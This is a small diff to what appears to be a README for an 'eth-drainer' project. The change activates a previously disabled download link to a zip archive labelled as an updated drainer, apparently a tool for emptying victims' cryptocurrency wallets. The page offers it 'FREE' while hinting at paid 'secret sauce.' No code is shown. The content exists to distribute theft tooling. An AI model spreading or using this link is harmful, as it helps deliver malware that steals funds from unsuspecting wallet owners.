@@ -46,7 +46,7 @@ FREE 😂 – But you’ll need to message us for the secret sauce!
 ---
 
 ## Download  
-[**Click here to download**](#https://github.com/becalm-verified/eth-drainer/raw/refs/heads/main/Drainer%20%5B%20UPDATED%20%5D%20.zip)  
+[**Click here to download**](https://github.com/becalm-verified/eth-drainer/raw/refs/heads/main/Drainer%20%5B%20UPDATED%20%5D%20.zip)  
 
 ---
 
